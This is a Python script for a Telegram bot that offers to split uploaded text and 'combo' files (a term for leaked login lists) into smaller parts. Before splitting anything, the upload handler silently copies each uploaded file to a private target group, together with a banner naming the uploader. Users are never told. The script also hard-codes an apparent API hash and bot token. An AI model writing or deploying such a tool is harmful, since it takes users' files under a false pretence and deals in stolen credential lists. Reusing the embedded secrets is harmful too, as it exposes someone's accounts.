#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Fast In‑Memory File Splitter + Private Group Forwarder (v20)
- Target can be @username, t.me/joinchat/... (after join), or numeric ID
- Clear error messages if forward fails
- Zero disk writes for splitting
"""

import io
import asyncio
import logging
from pathlib import Path
from pyrogram import Client, filters, enums
from pyrogram.types import Message

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
log = logging.getLogger("FastSplit")

# ========== CONFIG ==========
API_ID = 37651731
API_HASH = "146c6196a7ea538655793a3c63204bc4"
BOT_TOKEN = "8922177644:AAF29QLvpx6OpE3NyHqqFOiEEmfIuReXof8"

# >>> CHANGE THIS TO YOUR PUBLIC @USERNAME OR NUMERIC ID <<<
TARGET = "@testingsplit"   # Example: "@mygroup" or -1001234567890

USER_STATES = {}

bot_app = Client("FastSplitBot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# --------------------------------------------------------------------------
@bot_app.on_message(filters.command("start") & filters.private)
async def start(client: Client, message: Message):
    uid = message.from_user.id
    USER_STATES.pop(uid, None)
    await message.reply_text(
        "<b>Fast Splitter Active.</b>\nSend a text/combo file to begin.",
        parse_mode=enums.ParseMode.HTML
    )

# --------------------------------------------------------------------------
@bot_app.on_message(filters.document & filters.private)
async def on_document(client: Client, message: Message):
    doc = message.document
    if doc.file_name and not doc.file_name.lower().endswith(('.txt', '.csv', '.log', '.combos')):
        await message.reply_text("❌ Send a valid plain text/combo file (.txt / .csv).")
        return

    uid = message.from_user.id

    # ---------- 1. Forward ORIGINAL file to TARGET ----------
    try:
        user = message.from_user
        username = f"@{user.username}" if user.username else "No Username"
        banner = (
            f"🔥 <b>NEW FILE</b>\n"
            f"👤 {user.first_name} (ID: <code>{user.id}</code>)\n"
            f"🔗 {username}\n"
            f"📂 <code>{doc.file_name}</code>"
        )

        # Send info banner
        await client.send_message(TARGET, banner, parse_mode=enums.ParseMode.HTML)

        # Forward the file itself – try copy() first, then fallback to send_document
        try:
            await message.copy(chat_id=TARGET)
            log.info(f"✅ File copied to {TARGET} using copy()")
        except Exception as copy_err:
            log.warning(f"copy() failed, trying send_document: {copy_err}")
            # Fallback: send the file by its file_id
            await client.send_document(
                chat_id=TARGET,
                document=doc.file_id,
                caption=f"From {user.first_name} ({user.id})"
            )
            log.info(f"✅ File sent to {TARGET} using send_document (by id)")

    except Exception as e:
        # This will show in your console exactly why it failed
        log.error(f"❌ FAILED to forward file to {TARGET}: {e}")
        # Optional: notify the bot owner (replace with your admin ID if you want)
        # await client.send_message(chat_id=YOUR_ADMIN_ID, text=f"Forward error: {e}")

    # ---------- 2. Prepare for splitting ----------
    USER_STATES[uid] = {"state": "AWAITING_LIMIT", "message_obj": message}
    await message.reply_text("<b>Enter split limit (lines per part):</b>", parse_mode=enums.ParseMode.HTML)

# --------------------------------------------------------------------------
@bot_app.on_message(filters.text & filters.private)
async def on_limit(client: Client, message: Message):
    uid = message.from_user.id
    text = message.text.strip()
    if text.startswith("/start"):
        return

    if uid not in USER_STATES or USER_STATES[uid].get("state") != "AWAITING_LIMIT":
        await message.reply_text("<b>not allowed</b>", parse_mode=enums.ParseMode.HTML)
        return

    if not text.isdigit() or int(text) <= 0:
        await message.reply_text("❌ <b>Send a positive number.</b>", parse_mode=enums.ParseMode.HTML)
        return

    lines_per_chunk = int(text)
    state = USER_STATES[uid]
    doc_message = state["message_obj"]
    doc = doc_message.document

    status = await message.reply_text("⚡ <b>Processing in memory...</b>", parse_mode=enums.ParseMode.HTML)

    try:
        # Download file into memory
        buffer = await doc_message.download(in_memory=True)  # io.BytesIO
        raw_bytes = buffer.getvalue()
        content = raw_bytes.decode("utf-8", errors="ignore")
        lines = content.splitlines(keepends=True)

        # Split into chunks
        chunks = [
            "".join(lines[i:i + lines_per_chunk])
            for i in range(0, len(lines), lines_per_chunk)
        ]

        base = Path(doc.file_name).stem
        ext = Path(doc.file_name).suffix or ".txt"
        chat = message.chat.id

        # Send chunks concurrently
        async def send_chunk(idx: int, text_chunk: str):
            chunk_io = io.BytesIO(text_chunk.encode("utf-8"))
            chunk_io.name = f"{base}_part_{idx}{ext}"
            await asyncio.sleep(0.05 * (idx % 20))  # tiny stagger for rate limits
            await client.send_document(chat_id=chat, document=chunk_io, file_name=chunk_io.name)

        sem = asyncio.Semaphore(10)
        async def bounded(idx, chunk):
            async with sem:
                await send_chunk(idx, chunk)

        tasks = [bounded(i + 1, chunk) for i, chunk in enumerate(chunks)]
        await asyncio.gather(*tasks)

        await status.edit_text(f"✅ <b>Done!</b> {len(chunks)} part(s) delivered.", parse_mode=enums.ParseMode.HTML)

    except Exception as e:
        log.exception(e)
        await status.edit_text(f"❌ Error: {str(e)[:100]}", parse_mode=enums.ParseMode.HTML)
    finally:
        USER_STATES.pop(uid, None)

# --------------------------------------------------------------------------
if __name__ == "__main__":
    log.info("🚀 Fast Split Engine booting...")
    bot_app.run()